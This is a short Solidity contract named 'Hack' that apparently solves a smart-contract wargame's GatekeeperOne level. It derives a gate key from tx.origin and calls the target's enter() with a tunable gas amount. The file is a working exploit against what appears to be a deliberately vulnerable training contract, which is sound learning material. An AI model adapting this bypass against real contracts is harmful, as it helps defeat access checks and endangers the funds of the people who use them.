// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

interface IGateKeeperOne {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract Hack {
    function enter(address dateKeeperOneContractAddress, uint256 gas) external {
        IGateKeeperOne gateKeeperOneContract = IGateKeeperOne(dateKeeperOneContractAddress);

        uint16 gateKey16 = uint16(uint160(tx.origin));
        uint64 gateKey64 = uint64(1 << 63) + uint64(gateKey16);
        bytes8 gateKey = bytes8(gateKey64);

        require(gas < 8191, "gas > 8191");
        require(gateKeeperOneContract.enter{gas: 8191 * 10 + gas}(gateKey), "Failed");
    }
}